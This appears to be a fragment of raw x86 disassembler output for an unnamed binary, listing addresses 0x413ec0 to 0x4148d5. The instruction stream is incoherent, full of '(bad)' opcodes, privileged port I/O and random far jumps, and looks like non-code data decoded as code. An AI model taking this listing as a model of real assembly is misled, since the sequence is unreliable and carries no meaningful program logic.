  413ec0:	hlt    
  413ec1:	add    al,0x62
  413ec3:	(bad)
  413ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec7:	add    ch,BYTE PTR [ebp-0x68]
  413eca:	mov    al,ds:0x6925388c
  413ecf:	sbb    ebp,ecx
  413ed1:	xchg   ebp,eax
  413ed2:	loope  0x413e64
  413ed4:	jo     0x413eeb
  413ed6:	outs   dx,BYTE PTR ds:[esi]
  413ed7:	push   ds
  413ed8:	jp     0x413e66
  413eda:	mov    bl,0x3f
  413edc:	pop    esi
  413edd:	stc    
  413ede:	jno    0x413f2b
  413ee0:	xor    al,0x24
  413ee2:	jmp    0x5bc2:0x25b5081e
  413ee9:	lea    ebp,[ebx-0x4cba87c1]
  413eef:	push   es
  413ef0:	ficomp WORD PTR [edx]
  413ef2:	aas    
  413ef3:	mov    cl,bh
  413ef5:	add    al,0xe9
  413ef7:	mov    dh,BYTE PTR [eax-0xadcd8dc]
  413efd:	mov    ah,0x1d
  413eff:	xchg   ebp,eax
  413f00:	call   DWORD PTR ds:0xf0223f9b
  413f06:	pushf  
  413f07:	cmc    
  413f08:	fild   DWORD PTR [edx+esi*2]
  413f0b:	enter  0x8a03,0xab
  413f0f:	out    0x7c,eax
  413f11:	sar    bh,0xc
  413f14:	outs   dx,BYTE PTR ds:[esi]
  413f15:	rcr    DWORD PTR [edi],0x63
  413f18:	test   DWORD PTR [ecx-0x5b2c0a3d],0x1e75de1a
  413f22:	std    
  413f23:	push   0x0
	...
  413f3d:	cmp    DWORD PTR [ecx+eax*2],eax
  413f40:	pusha  
  413f41:	stos   DWORD PTR es:[edi],eax
  413f42:	loope  0x413f42
  413f44:	cmp    al,0xdc
  413f46:	push   es
  413f47:	mov    dh,0xa9
  413f49:	stc    
  413f4a:	dec    esi
  413f4b:	pop    DWORD PTR [ecx]
  413f4d:	gs aad 0xff
  413f50:	jmp    0xa69834d7
  413f55:	mov    edi,ecx
  413f57:	mov    dh,BYTE PTR [edx+0x3f179109]
  413f5d:	add    DWORD PTR [ecx+0x9838e0f],edx
  413f63:	(bad)  
  413f64:	cld    
  413f65:	jmp    FWORD PTR [ebx+eiz*1]
  413f68:	popf   
  413f69:	jmp    0x7c6dc784
  413f6e:	xor    bh,0xe8
  413f71:	call   0xf82ad2f6
  413f76:	add    al,0x3d
  413f78:	add    BYTE PTR [edi+edx*1],dl
  413f7b:	(bad)  
  413f7c:	out    0x7b,al
  413f7e:	mov    edi,?
  413f80:	call   0xbe00bf7c
  413f85:	clc    
  413f86:	xlat   BYTE PTR ds:[ebx]
  413f87:	sbb    eax,0x7416e93d
  413f8c:	retf   0xc072
  413f8f:	iret   
  413f90:	pusha  
  413f91:	jb     0x414004
  413f93:	(bad)  
  413f94:	call   0x985c990
  413f99:	mov    bh,0x35
  413f9b:	add    DWORD PTR [ecx+0xedb9100],edi
	...
  413fb9:	add    BYTE PTR [edx+0x3000ff09],al
  413fbf:	inc    ebp
  413fc0:	adc    al,0x40
  413fc2:	sbb    eax,0x1a20438c
  413fc7:	scas   eax,DWORD PTR es:[edi]
  413fc8:	inc    esi
  413fc9:	add    DWORD PTR [edx],ebx
  413fcb:	scas   eax,DWORD PTR es:[edi]
  413fcc:	dec    esi
  413fcd:	add    bl,BYTE PTR [edi+eiz*8+0x5a70b06]
  413fd4:	ror    DWORD PTR [ecx+0x882910],0x4e
  413fdb:	int3   
  413fdc:	or     bh,BYTE PTR [ecx+esi*8]
  413fdf:	add    DWORD PTR [eax+edi*2-0x74020e76],eax
  413fe6:	adc    cl,bl
  413fe8:	mov    DWORD PTR [ebp+0x69],ecx
  413feb:	jg     0x413f71
  413fed:	xchg   esp,eax
  413fee:	popf   
  413fef:	or     BYTE PTR [eax],al
  413ff1:	lea    edx,[eax]
  413ff3:	clc    
  413ff4:	cld    
  413ff5:	dec    DWORD PTR [edx+0x110fc62d]
  413ffb:	push   ebp
  413ffc:	in     eax,0xff
  413ffe:	jp     0x413ff1
  414000:	adc    edx,DWORD PTR [edx+edx*2+0x45]
  414004:	(bad)  
  414005:	call   0x3f29df
  41400a:	push   ss
  41400b:	inc    ebx
  41400c:	fimul  DWORD PTR [ebp-0x30820]
  414012:	retf   0xc62c
  414015:	je     0x41406a
  414017:	icebp  
  414018:	adc    edx,DWORD PTR [edx+edx*1+0x45]
  41401c:	dec    BYTE PTR [edx+0x0]
	...
  414036:	add    BYTE PTR [eax+0x508ce71c],ah
  41403c:	or     BYTE PTR [eax],al
  41403e:	mov    edx,DWORD PTR [eax-0x16b27628]
  414044:	jle    0x413fca
  414046:	xchg   esp,eax
  414047:	sbb    eax,0x908d0008
  41404c:	idiv   esp
  41404e:	push   esp
  414050:	cli    
  414051:	xlat   BYTE PTR ds:[ebx]
  414052:	(bad)  
  414053:	mov    al,ds:0xa8141b2b
  414058:	loop   0x414019
  41405a:	inc    esi
  41405c:	ffree  st(2)
  41405e:	call   0xfe5d4352
  414063:	outs   dx,DWORD PTR ds:[esi]
  414064:	imul   esp,esi,0xc212498a
  41406a:	dec    edi
  41406b:	jmp    0x414025
  41406d:	jecxz  0x41406d
  41406f:	imul   ebx,DWORD PTR [edx],0x44cc7419
  414075:	mov    edi,0x8e4ad3dd
  41407a:	inc    esp
  41407b:	in     al,0x94
  41407d:	cmp    DWORD PTR [edi-0xc],0x318b021d
  414084:	mov    ebx,DWORD PTR es:[ebp+0x28]
  414088:	xchg   ebp,eax
  414089:	shr    DWORD PTR [edi-0x61],0x63
  41408d:	mov    es,WORD PTR [esp+ebx*4+0x34]
  414091:	mov    edi,0x36b0eb13
  414096:	in     eax,0x93
  414098:	mov    bl,BYTE PTR [edx]
  41409a:	je     0x41409c
	...
  4140b4:	in     al,dx
  4140b5:	xchg   esi,eax
  4140b6:	mov    al,0xf3
  4140b8:	adc    DWORD PTR [eax],0x12
  4140bb:	mov    dh,BYTE PTR [edx-0x5718b15a]
  4140c1:	(bad)  
  4140c2:	sbb    bh,dh
  4140c4:	jno    0x4140a3
  4140c6:	or     al,BYTE PTR [ebx+eiz*4-0x8fffde3]
  4140cd:	pusha  
  4140ce:	push   cs
  4140cf:	(bad)  
  4140d0:	mov    ecx,0x10741931
  4140d5:	cmp    BYTE PTR [edx],al
  4140d7:	dec    ecx
  4140d9:	cmp    DWORD PTR [ebp-0x5a7c42a],ecx
  4140df:	mov    bh,BYTE PTR [edi]
  4140e1:	add    al,0xbf
  4140e3:	sbb    ah,BYTE PTR [eax-0x106ee20c]
  4140e9:	adc    ebx,DWORD PTR [ebx+0x32200c0b]
  4140ef:	sbb    edx,DWORD PTR [edx]
  4140f1:	mov    DWORD PTR [eax],ebp
  4140f3:	nop
  4140f4:	inc    ebp
  4140f5:	sbb    eax,0x4f40011
  4140fa:	pusha  
  4140fb:	mov    ecx,0xef9b7cff
  414100:	cs cmp eax,0x98eaca63
  414106:	add    BYTE PTR [edi-0x6f2ae6b8],cl
  41410c:	retf   
  41410d:	jle    0x4140b5
  41410f:	mov    ?,WORD PTR [esi-0x35c1b6e3]
  414115:	adc    ah,BYTE PTR [ebx+0x43]
	...
  414130:	add    BYTE PTR [edi-0xb],al
  414133:	jmp    0x235408f0
  414138:	lock jle 0x414103
  41413b:	cld    
  41413c:	fidiv  WORD PTR [eax]
  41413e:	or     eax,0xf28e381c
  414143:	popa   
  414144:	leave  
  414145:	pop    ds
  414146:	mov    BYTE PTR [edi+0x26cdeb8f],bl
  41414c:	test   al,0x5
  41414e:	test   cl,0xb8
  414151:	sti    
  414152:	call   0xc15f:0xc53bd6e6
  414159:	iret   
  41415a:	int    0x30
  41415c:	or     bh,BYTE PTR [ebx-0x6b]
  41415f:	inc    ebp
  414160:	sbb    ah,BYTE PTR [edx-0x32]
  414163:	mov    bl,0x17
  414165:	jmp    0x7112:0x52221486
  41416c:	rcl    BYTE PTR [edi],0xc5
  41416f:	outs   dx,DWORD PTR ds:[esi]
  414170:	rcl    BYTE PTR [edi],0x12
  414173:	(bad)  
  414174:	mov    ebx,0xc3d67f1b
  414179:	not    DWORD PTR [ecx]
  41417b:	je     0x414182
  41417d:	jnp    0x4141be
  41417f:	(bad)  
  414180:	xchg   esp,eax
  414181:	pop    ds
  414182:	mov    eax,0x13279cfe
  414187:	je     0x414166
  414189:	out    dx,al
  41418a:	cwde   
  41418b:	pop    es
  41418c:	adc    DWORD PTR [ebp+0x2c],edx
  41418f:	(bad)  
  414190:	inc    BYTE PTR [ebx+0x6c0e51]
	...
  4141ae:	push   ebp
  4141af:	push   es
  4141b0:	add    cl,ch
  4141b2:	loop   0x414164
  4141b4:	repz and ah,BYTE PTR [ebx+0xfbb720d]
  4141bb:	or     al,0xe4
  4141bd:	(bad)  
  4141be:	std    
  4141bf:	jle    0x41420e
  4141c1:	dec    ebp
  4141c2:	push   ebx
  4141c3:	cmp    eax,0x291d6d0e
  4141c8:	(bad)  
  4141c9:	mov    esi,0xe66bafa1
  4141ce:	jno    0x4141f7
  4141d0:	in     al,0xae
  4141d2:	or     eax,0xfcf15ccf
  4141d7:	mov    bl,ah
  4141d9:	test   ch,bh
  4141db:	adc    dh,BYTE PTR [edx]
  4141dd:	test   eax,0x2d457cb0
  4141e2:	mov    cl,0x49
  4141e4:	call   0xfe54186d
  4141e9:	jb     0x41422e
  4141eb:	sbb    DWORD PTR [eax],edi
  4141ed:	sub    al,0x84
  4141ef:	add    cl,BYTE PTR [ebp-0x1ecec5b]
  4141f5:	and    ch,BYTE PTR [esi-0x5395f163]
  4141fb:	daa    
  4141fc:	(bad)  
  4141fd:	push   esi
  4141fe:	in     eax,dx
  4141ff:	pop    edx
  414200:	add    ah,BYTE PTR [edx-0x40]
  414203:	(bad)  
  414204:	rol    DWORD PTR [eax],1
  414206:	fsubrp st(5),st
  414208:	add    eax,0x89eade42
  41420d:	dec    ebp
  41420e:	stc    
  41420f:	(bad)
	...
  41422a:	add    BYTE PTR [edi-0x66bcf7fc],dl
  414230:	fmul   DWORD PTR ds:0xfdf1a184
  414236:	inc    DWORD PTR [edx]
  414238:	push   edx
  414239:	adc    bh,bh
  41423b:	push   0xf2006831
  414240:	sbb    DWORD PTR [edx],0x73ebea8b
  414246:	sbb    BYTE PTR [esi+0x68ff54bf],dl
  41424c:	adc    al,0xfd
  41424e:	jne    0x414231
  414250:	in     eax,dx
  414251:	jae    0x41425b
  414253:	(bad)
  414256:	inc    edx
  414258:	(bad)  
  414259:	mov    esi,0xcfdb7a74
  41425e:	add    ebx,ebp
  414260:	add    al,0x89
  414262:	pop    ebp
  414263:	xor    DWORD PTR [ecx],0x31dd7dc6
  414269:	pop    esp
  41426a:	ins    BYTE PTR es:[edi],dx
  41426b:	out    dx,al
  41426c:	and    BYTE PTR ds:0xc6819eb6,cl
  414272:	xor    ebx,DWORD PTR [edi-0x77]
  414275:	fild   WORD PTR [edi]
  414277:	iret   
  414278:	fchs   
  41427a:	mov    esi,eax
  41427c:	hlt    
  41427d:	mov    edi,0x2829ee8
  414282:	or     BYTE PTR [ecx],bl
  414284:	aam    0x72
  414286:	sub    dh,cl
  414288:	in     eax,dx
  414289:	inc    ebx
  41428a:	adc    al,0xd6
  41428c:	dec    esi
  41428d:	adc    bh,BYTE PTR [ebx]
	...
  4142a7:	add    BYTE PTR [eax-0x392a8514],bl
  4142ad:	adc    DWORD PTR [ecx+0x7d39f446],ecx
  4142b3:	mov    edi,0x5cdb0ac8
  4142b8:	cld    
  4142b9:	dec    edi
  4142ba:	or     BYTE PTR [ebx],dh
  4142bc:	sub    eax,0x984d895d
  4142c1:	adc    al,BYTE PTR [ecx+0xe]
  4142c4:	xor    DWORD PTR [edi+0x20],0xfffffffe
  4142c8:	sub    esp,DWORD PTR [ebx]
  4142ca:	mov    ch,0xfb
  4142cc:	repz fwait
  4142ce:	sti    
  4142cf:	in     al,0x1b
  4142d1:	test   DWORD PTR [ebx-0x76a227bc],0x8e06d044
  4142db:	and    ebp,DWORD PTR [edi-0x9]
  4142de:	lods   al,BYTE PTR ds:[esi]
  4142df:	(bad)  
  4142e0:	cli    
  4142e1:	nop
  4142e2:	test   BYTE PTR [edx+0x178c1ebf],0x42
  4142e9:	daa    
  4142ea:	nop
  4142eb:	pavgw  mm7,QWORD PTR [eax+0x2661ff07]
  4142f2:	sub    cl,BYTE PTR [ebp+ebp*4+0x3e]
  4142f6:	push   ss
  4142f7:	test   BYTE PTR [esi+edx*1+0x1df74c7f],dh
  4142fe:	add    cl,BYTE PTR [ebx-0x1]
  414301:	clc    
  414302:	pop    ss
  414303:	jb     0x4142cd
  414305:	inc    esp
  414306:	and    ah,bl
  414308:	stos   DWORD PTR es:[edi],eax
  414309:	data16 mov al,BYTE PTR [ebp+0x0]
	...
  414325:	and    BYTE PTR [ecx+0x55700e43],ch
  41432b:	pop    ds
  41432c:	(bad)  
  41432d:	xchg   ebx,eax
  41432e:	xor    dh,BYTE PTR [edi+0x469ffb07]
  414334:	jecxz  0x4142b9
  414336:	mov    gs,WORD PTR [ecx+esi*8]
  414339:	xchg   ecx,eax
  41433a:	xchg   esi,eax
  41433b:	push   ss
  41433c:	mov    bh,BYTE PTR [edx-0x44080df]
  414342:	add    al,0x6d
  414344:	push   edi
  414345:	push   edi
  414346:	minps  xmm3,xmm3
  414349:	mov    eax,0x897de5fc
  41434e:	sub    BYTE PTR [ebp+0x17],cl
  414351:	jl     0x414309
  414353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414354:	fidiv  DWORD PTR ds:0x3a211f1d
  41435a:	punpcklwd mm0,mm1
  41435d:	xlat   BYTE PTR ds:[ebx]
  41435e:	les    ebx,FWORD PTR [edi-0x37]
  414361:	pop    es
  414362:	jle    0x41430f
  414364:	fbstp  TBYTE PTR [ebx-0x4f7532e5]
  41436a:	or     al,0xcf
  41436c:	shl    bh,0xff
  41436f:	pop    ebx
  414370:	jae    0x414389
  414372:	syscall 
  414374:	(bad)  [ecx+0x5e82eda0]
  41437a:	sub    ebp,esi
  41437c:	push   ss
  41437d:	add    dl,BYTE PTR [edi-0x17]
  414380:	mov    bh,BYTE PTR [ecx]
  414382:	aad    0xf5
  414384:	dec    ebp
  414385:	idiv   esp
  414387:	sub    ebp,ebx
	...
  4143a1:	add    BYTE PTR [eax],dh
  4143a3:	sbb    ebp,esp
  4143a5:	or     BYTE PTR [ecx+0x29],0xcd
  4143a9:	push   ss
  4143aa:	retf   0xdcc8
  4143ad:	push   ss
  4143ae:	dec    eax
  4143af:	jmp    0x98fc4806
  4143b4:	aam    0x8a
  4143b6:	retf   0x330e
  4143b9:	cld    
  4143ba:	jle    0x4143f6
  4143bc:	ds pop ss
  4143be:	sub    ch,dh
  4143c0:	popf   
  4143c1:	nop
  4143c2:	out    dx,eax
  4143c3:	or     eax,0x619c0c1b
  4143c8:	mov    al,0x16
  4143ca:	mov    cl,BYTE PTR [eax+0x1c458fa8]
  4143d0:	push   ecx
  4143d1:	add    esp,esi
  4143d3:	add    al,0x0
  4143d5:	bound  esi,QWORD PTR [edx+eiz*8]
  4143d8:	aas    
  4143d9:	pusha  
  4143da:	xor    al,0xe2
  4143dc:	dec    edi
  4143dd:	push   edx
  4143de:	dec    edi
  4143df:	jnp    0x414425
  4143e1:	popa   
  4143e2:	cmp    cl,cl
  4143e4:	adc    esp,esi
  4143e6:	jl     0x4143c0
  4143e8:	jecxz  0x414438
  4143ea:	loop   0x4143b6
  4143ec:	pop    ebp
  4143ed:	aad    0xfa
  4143ef:	cmp    DWORD PTR ds:0xe0ee244,0x38c1f67f
  4143f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143fa:	sti    
  4143fb:	inc    BYTE PTR [ecx+ecx*8+0x1efe0f03]
  414402:	xor    al,0xf2
  414404:	(bad)  
  414405:	pushf  
	...
  41441e:	add    BYTE PTR [ebx],dh
  414420:	pushf  
  414421:	dec    DWORD PTR ds:0x1e8aea64
  414427:	jmp    0xfeb7:0xae721798
  41442e:	jl     0x414417
  414430:	push   cs
  414431:	je     0x414410
  414433:	add    bl,BYTE PTR [ecx+0x3592d107]
  414439:	(bad)  
  41443a:	ficomp WORD PTR [ebx+0x4e]
  41443d:	jae    0x4143cf
  41443f:	pop    ds
  414440:	mov    ecx,0x79f7e901
  414445:	inc    esp
  414446:	or     eax,0x5447cb8
  41444b:	sbb    BYTE PTR [edx],0x2e
  41444e:	bound  esi,QWORD PTR [ebx+0x15]
  414451:	cmp    BYTE PTR [esp+eiz*4],ah
  414454:	dec    BYTE PTR [ecx+ecx*4-0x1d01f12b]
  41445b:	popa   
  41445c:	cdq    
  41445d:	push   cs
  41445e:	push   0xffffffe0
  414460:	and    esi,edi
  414462:	mov    ?,ecx
  414464:	push   esi
  414465:	add    al,BYTE PTR [eax]
  414467:	push   es
  414468:	inc    edi
  414469:	movnti DWORD PTR cs:[eax+ecx*1],eax
  41446e:	inc    ebx
  41446f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414470:	dec    esi
  414471:	repnz (bad)
  414474:	ret    
  414475:	loope  0x414476
  414477:	(bad)  
  414479:	inc    ebx
  41447a:	adc    al,0xba
  41447c:	jge    0x4144a0
  41447e:	push   0x5d
  414480:	clc    
  414481:	jae    0x41449f
	...
  41449b:	add    dh,dl
  41449d:	(bad)  
  41449f:	jne    0x4144f6
  4144a1:	jl     0x41446c
  4144a3:	push   esi
  4144a4:	cli    
  4144a5:	jge    0x4144b5
  4144a7:	push   DWORD PTR [eax+0x5]
  4144aa:	push   DWORD PTR [ebp+0x15]
  4144ad:	fincstp 
  4144af:	xlat   BYTE PTR ds:[ebx]
  4144b0:	(bad)  
  4144b2:	add    eax,0xffffff81
  4144b5:	mov    bl,0xe7
  4144b7:	clc    
  4144b8:	sbb    al,0x1
  4144ba:	add    BYTE PTR [ebx-0x76c1d2b0],cl
  4144c0:	push   eax
  4144c1:	sub    eax,0x7c25eb4e
  4144c6:	inc    ebx
  4144c7:	clc    
  4144c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c9:	dec    ebx
  4144ca:	adc    cl,BYTE PTR [edi]
  4144cc:	dec    eax
  4144cd:	xchg   cl,ah
  4144cf:	(bad)  
  4144d0:	fisubr DWORD PTR ds:0x85ca6c5c
  4144d6:	mov    esp,esp
  4144d8:	stos   BYTE PTR es:[edi],al
  4144d9:	icebp  
  4144da:	or     eax,0x3745deb6
  4144df:	inc    ebp
  4144e0:	add    DWORD PTR [ecx],0xf1ae6d84
  4144e6:	std    
  4144e7:	jmp    eax
  4144e9:	adc    al,0xfd
  4144eb:	jne    0x4144de
  4144ed:	pop    esi
  4144ee:	(bad)  
  4144ef:	inc    BYTE PTR [eax]
  4144f1:	or     eax,0x7b7ad789
  4144f6:	push   ss
  4144f7:	mov    esi,esp
  4144f9:	data16 lods al,BYTE PTR ds:[esi]
  4144fb:	inc    BYTE PTR [ecx]
  4144fd:	push   cs
  4144fe:	adc    esi,DWORD PTR [eax+eax*1+0x0]
	...
  414516:	add    BYTE PTR [eax],al
  414518:	add    al,dh
  41451a:	or     BYTE PTR [ebp+0x2bbf8c07],0xfe
  414521:	jae    0x4144bc
  414523:	inc    edx
  414524:	jae    0x4144d3
  414526:	test   DWORD PTR [eax+0x0],esp
  414529:	hlt    
  41452a:	sbb    eax,0x884df1a8
  41452f:	add    DWORD PTR [eax],eax
  414531:	hlt    
  414532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414533:	mov    ebp,0xee617dfb
  414538:	mov    bh,BYTE PTR [ecx-0x4e773c07]
  41453e:	add    DWORD PTR [eax+ebp*8+0x21c94],esi
  414545:	jg     0x4145a8
  414547:	sbb    bh,BYTE PTR [eax]
  414549:	mov    ecx,0xf98d0309
  41454e:	(bad)  
  41454f:	adc    edi,esi
  414551:	jg     0x4145b7
  414553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414554:	cmp    ch,BYTE PTR ds:0x18227f2b
  41455a:	add    edx,DWORD PTR [edx+eax*4]
  41455d:	jns    0x414570
  41455f:	add    eax,0xbca73775
  414564:	pop    ss
  414565:	jno    0x414544
  414567:	mov    ss,WORD PTR [esi]
  414569:	dec    esi
  41456a:	push   ds
  41456b:	mov    dl,0x8c
  41456d:	inc    edx
  41456e:	or     bh,BYTE PTR [ebp-0x3e]
  414571:	fsub   QWORD PTR [ebx-0x10]
  414574:	dec    ebx
  414576:	mov    al,ds:0x4d790e43
  41457b:	and    eax,0xfe
	...
  414594:	add    BYTE PTR [eax],al
  414596:	mov    ebx,0x3a8ae836
  41459b:	xor    bl,ch
  41459d:	(bad)  
  41459e:	out    dx,eax
  41459f:	je     0x41453b
  4145a1:	sbb    ebp,DWORD PTR [esi+0x4]
  4145a4:	repnz int 0x29
  4145a7:	fst    DWORD PTR [ebx]
  4145a9:	stc    
  4145aa:	jbe    0x4145b8
  4145ac:	out    0x2,eax
  4145ae:	jo     0x4145e1
  4145b0:	mov    dl,BYTE PTR [ebx]
  4145b2:	cmp    BYTE PTR [esi+0x29],0x5
  4145b6:	mov    esi,0x7802cbc2
  4145bb:	cmp    eax,0x7f6a138a
  4145c0:	sbb    ebx,DWORD PTR [eax]
  4145c2:	repnz push edx
  4145c4:	jmp    0xa94f7a4f
  4145c9:	xchg   BYTE PTR [ebx+edi*8-0x1b],cl
  4145cd:	mov    al,dh
  4145cf:	or     ecx,DWORD PTR [ebp+0x13]
  4145d2:	inc    edx
  4145d3:	loopne 0x414648
  4145d5:	addr16 test ch,0xe8
  4145d9:	xchg   BYTE PTR [ebx],ch
  4145db:	(bad)  
  4145dc:	in     eax,0x87
  4145de:	inc    edx
  4145df:	add    al,0xe9
  4145e1:	add    esi,ebx
  4145e3:	or     BYTE PTR [eax+0x26],0x1a
  4145e7:	or     ebp,DWORD PTR [ecx+0xc]
  4145ea:	call   DWORD PTR [edx-0x6fc7908]
  4145f0:	xchg   esp,eax
  4145f1:	out    dx,al
  4145f2:	rol    BYTE PTR [ecx-0x40bfc18],0x63
  4145f9:	jg     0x4145fb
	...
  414613:	aad    0xa
  414615:	cmc    
  414616:	(bad)  
  414617:	stos   DWORD PTR es:[edi],eax
  414618:	int3   
  414619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41461a:	mov    ds:0x256a7ff2,eax
  41461f:	fimul  DWORD PTR [edx]
  414621:	iret   
  414622:	pop    edi
  414623:	ror    DWORD PTR [edx],cl
  414625:	call   0xddda6ff8
  41462a:	xchg   BYTE PTR [esi+0x7403e905],dl
  414630:	into   
  414631:	repnz add bh,BYTE PTR [ecx+0x6f]
  414635:	(bad)  
  414636:	call   0xc0844b32
  41463b:	sub    ecx,DWORD PTR [edx]
  41463d:	(bad)  
  41463e:	jmp    0xee4958b5
  414643:	jnp    0x4145f1
  414645:	loope  0x4145dd
  414647:	out    0x86,al
  414649:	test   ecx,0x8b5080f6
  41464f:	out    0xa,al
  414651:	cmp    al,0x49
  414653:	test   DWORD PTR [eax+eax*1],0xf7878c82
  41465a:	loopne 0x4145e7
  41465c:	nop
  41465d:	and    BYTE PTR [ecx+0x57],0x96
  414661:	jo     0x41467f
  414663:	fmul   DWORD PTR [ecx]
  414665:	(bad)  
  414666:	jmp    0x4b75c661
  41466b:	out    0xa,al
  41466d:	jmp    0x66bb:0x91272cd
  414674:	xchg   edi,esi
  414676:	in     al,0x0
	...
  414690:	test   BYTE PTR [edx+0xb064b24],0x3c
  414697:	ins    BYTE PTR es:[edi],dx
  414698:	test   DWORD PTR [eax+eax*1],0xf7875012
  41469f:	jecxz  0x414697
  4146a1:	xchg   BYTE PTR [ebx+ecx*1],dl
  4146a4:	out    0xa,al
  4146a6:	add    BYTE PTR [ecx],0xf4
  4146a9:	xchg   edx,eax
  4146aa:	inc    eax
  4146ab:	mov    esp,0xe9fe097c
  4146b0:	or     bh,BYTE PTR [eax]
  4146b2:	mov    bl,BYTE PTR [edi-0xefcf035]
  4146b8:	repz sbb eax,0xd5b672c4
  4146be:	cmc    
  4146bf:	in     eax,dx
  4146c0:	iret   
  4146c1:	add    eax,0xb8410beb
  4146c6:	xor    eax,DWORD PTR [eax]
  4146c8:	jnp    0x4146c6
  4146ca:	pop    es
  4146cb:	add    esi,eax
  4146cd:	scas   eax,DWORD PTR es:[edi]
  4146ce:	mov    DWORD PTR [esi-0x57],ecx
  4146d1:	jmp    0x4146d5
  4146d3:	or     BYTE PTR [eax+ebp*8+0x2ce38b0e],cl
  4146da:	hlt    
  4146db:	add    al,0x85
  4146dd:	adc    eax,0x4716a1e9
  4146e2:	xor    dh,dh
  4146e4:	cdq    
  4146e5:	or     eax,0xc4090f0e
  4146ea:	(bad)  
  4146ec:	repnz repz inc ebx
  4146ef:	adc    al,0xe2
  4146f1:	jno    0x414715
  4146f3:	push   0x0
	...
  41470d:	dec    ebp
  41470e:	hlt    
  41470f:	jae    0x41472d
  414711:	out    0xcb,al
  414713:	std    
  414714:	jne    0x41470b
  414716:	xchg   ecx,ecx
  414718:	push   esi
  414719:	mov    ds:0x28ff0e71,al
  41471e:	or     ebp,edi
  414720:	jne    0x414767
  414722:	in     eax,dx
  414723:	add    edx,esi
  414725:	repnz repz add eax,0x12
  41472a:	cmp    DWORD PTR [ebx-0x2],0x3e9f3d2
  414731:	xchg   eax,edi
  414733:	push   esi
  414734:	pop    edi
  414735:	push   ebx
  414736:	pop    eax
  414737:	mov    edx,0x3690053d
  41473d:	rol    DWORD PTR [eax-0x2],1
  414740:	adc    ebp,edi
  414742:	inc    eax
  414743:	(bad)  
  414744:	sbb    bh,bh
  414746:	inc    eax
  414747:	(bad)  
  414748:	and    eax,0x57fe40ff
  41474d:	out    dx,al
  41474e:	inc    eax
  41474f:	(bad)  
  414750:	push   esi
  414751:	test   eax,0xb96bfe44
  414756:	inc    esp
  414757:	inc    BYTE PTR [esi-0x3dc60c]
  41475d:	pop    edi
  41475e:	inc    edx
  41475f:	ret    0x89ff
  414762:	cmp    al,dl
  414764:	(bad)  
  414765:	mov    edx,0xc2ffc242
  41476a:	cmp    eax,edx
  41476c:	call   esp
  41476e:	inc    ecx
  41476f:	ret    0xff
	...
  41478a:	mov    eax,0x3cffc27a
  41478f:	add    edx,0xc279b5ff
  414795:	(bad)  
  414796:	mov    esi,0xfbffc27f
  41479b:	ja     0x41475f
  41479d:	jmp    FWORD PTR [eax+0x7c]
  4147a0:	ret    0x52ff
  4147a3:	jl     0x414767
  4147a5:	push   DWORD PTR [edx+edi*2-0x3e]
  4147a9:	inc    DWORD PTR [eax+0x1effc2bd]
  4147af:	mov    esp,0xc644ffc2
  4147b4:	ret    0xe5ff
  4147b7:	(bad)  
  4147bb:	mov    dl,0xc2
  4147bd:	dec    DWORD PTR [eax-0x3b003d4b]
  4147c3:	(bad)  
  4147c7:	(bad)  
  4147cb:	hlt    
  4147cc:	ret    0x90ff
  4147cf:	hlt    
  4147d0:	ret    0x73ff
  4147d3:	add    eax,0x4adffc3
  4147d8:	ret    
  4147d9:	dec    edi
  4147db:	icebp  
  4147dc:	ret    0xc1ff
  4147df:	bnd ret 0xa1ff
  4147e3:	add    al,bl
  4147e5:	dec    edi
  4147e7:	add    al,bl
  4147e9:	(bad)  
  4147ea:	fld    QWORD PTR [edx+edx*8]
  4147ed:	les    eax,FWORD PTR [eax]
	...
  414807:	rol    DWORD PTR [eax],cl
  414809:	int    0xc4
  41480b:	retf   
  41480c:	cmc    
  41480d:	(bad)  
  41480e:	(bad)
  414812:	les    edi,FWORD PTR [ebx-0x4c3b2930]
  414818:	repz into 
  41481a:	les    ebp,FWORD PTR [ebx-0x5c3b3958]
  414820:	fwait
  414821:	mov    esi,0x96939bc4
  414826:	les    edx,FWORD PTR [ebx-0x743b717b]
  41482c:	inc    DWORD PTR [eax-0x79bf7c3c]
  414832:	les    edi,FWORD PTR [ebx-0x7a]
  414835:	add    ah,0x73
  414838:	xor    BYTE PTR [ebx-0x6a69943c],bl
  41483e:	les    esp,FWORD PTR [ebx-0x24]
  414841:	mov    ah,al
  414843:	pop    ebx
  414844:	ja     0x41488a
  414846:	les    edx,FWORD PTR [ebx-0x1a]
  414849:	cmp    eax,esp
  41484b:	dec    ebx
  41484c:	push   edx
  41484d:	xor    eax,esp
  41484f:	inc    ebx
  414850:	sub    DWORD PTR [esi],0xffffffc4
  414853:	cmp    ebp,DWORD PTR [ebx+edi*1]
  414856:	les    esi,FWORD PTR [ebx]
  414858:	dec    ecx
  414859:	xor    eax,esp
  41485b:	sub    ebp,DWORD PTR [ebx*1+0xd7f23c4]
  414862:	les    ebx,FWORD PTR [ebx]
  414864:	cmp    eax,0x3513c445
  414869:	push   ss
  41486a:	les    eax,FWORD PTR [eax]
	...
  414884:	or     eax,DWORD PTR [ebx+0x4403c41d]
  41488a:	adc    eax,0xf7fbc4
  41488f:	(bad)  
  414890:	repz mov ecx,0x70ebc400
  414896:	push   eax
  414898:	mov    bh,0x6
  41489a:	shl    ecx,1
  41489c:	mov    bh,0x6
  41489e:	inc    ebp
  41489f:	fidiv  WORD PTR [edi-0x4835e5fa]
  4148a5:	push   es
  4148a6:	shl    BYTE PTR [edx-0x36f2f949],1
  4148ac:	mov    bh,0x6
  4148ae:	jbe    0x414898
  4148b0:	mov    eax,0xf5e8fe06
  4148b5:	add    DWORD PTR [ebp*8-0x1ef90114],eax
  4148bc:	cwde   
  4148bd:	cld    
  4148be:	or     dh,ch
  4148c0:	xchg   ebx,eax
  4148c1:	mov    ebp,0xf789ec48
  4148c6:	psubb  mm0,QWORD PTR [eax-0xc]
  4148ca:	adc    dh,ch
  4148cc:	jl     0x4148be
  4148ce:	push   ss
  4148cf:	loope  0x414931
  4148d1:	in     al,dx
  4148d2:	sbb    ebx,esp
  4148d4:	pop    ebp
  4148d5:	in     al,dx
